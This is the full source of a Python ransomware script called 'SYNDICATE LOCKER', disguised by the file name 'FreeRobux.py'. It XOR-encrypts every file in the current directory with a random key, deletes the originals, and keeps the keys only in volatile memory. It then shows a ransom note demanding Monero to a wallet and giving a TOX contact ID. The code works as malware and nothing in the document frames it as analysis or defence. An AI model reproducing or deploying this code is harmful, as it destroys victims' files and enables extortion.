import ctypes,os,sys,time
k32=ctypes.windll.kernel32
k32.VirtualAlloc.restype=ctypes.c_void_p
k32.VirtualAlloc.argtypes=[ctypes.c_void_p,ctypes.c_size_t,ctypes.c_ulong,ctypes.c_ulong]
m,r,p=0x1000,0x2000,0x04
s_name="FreeRobux.py"
k_size=32
f_size=60
marker=b'\xAA\xBB\xCC\xDD'
def x(d,k):
    if not k:return b''
    o=bytearray()
    kl=len(k)
    for i,b in enumerate(d):o.append(b^k[i%kl])
    return bytes(o)
def note():
    return """
<==================================================================>
                    !!! SYNDICATE LOCKER !!!
<==================================================================>

Your network has been breached and all your files have been encrypted.
Do not waste your time attempting to recover them. We use a military-
grade encryption algorithm that is impossible to break.

To restore your data, you must purchase our decrypter.

Payment is 5 Monero (XMR) to the following wallet:
45i3fEE5547eB5y6152Fh321v9aKzDSb353fL9bA78gH5f6s2D4hG1jK3l4mN5oP6qR7sT8u

After payment, contact us via TOX chat with your transaction ID.
TOX ID: 5A1B79C4E0F1234567890ABCCPF1234567890ABCDEF1234567890ABCDEF

You have 48 hours. After that, your decryption key will be destroyed.
Any interference will lead to the immediate destruction of your key.

<==================================================================>
    [System is locked. Awaiting further commands...]
<==================================================================>
"""
def run():
    f_list=[f for f in os.listdir('.') if os.path.isfile(os.path.join('.',f)) and f!=s_name and not f.endswith('.enc')]
    if not f_list:return
    e_size=f_size+k_size+len(marker)
    t_size=4+(len(f_list)*e_size)
    m_ptr=k32.VirtualAlloc(None,t_size,m|r,p)
    if not m_ptr:sys.exit(1)
    c_off=0
    for f_name in f_list:
        try:
            k=os.urandom(k_size)
            f_bytes=f_name.encode('utf-8')[:f_size].ljust(f_size,b'\x00')
            blob=f_bytes+k+marker
            buff=(ctypes.c_char*len(blob)).from_buffer_copy(blob)
            ctypes.memmove(m_ptr+c_off,buff,len(blob))
            c_off+=e_size
            with open(f_name,"rb") as f_in:p_text=f_in.read()
            c_text=x(p_text,k)
            with open(f_name+".enc","wb") as f_out:f_out.write(c_text)
            os.remove(f_name)
        except:continue
    os.system('cls' if os.name=='nt' else 'clear')
    print(note())
    try:
        while True:time.sleep(3600)
    except KeyboardInterrupt:sys.exit(0)
if __name__=="__main__":
    run()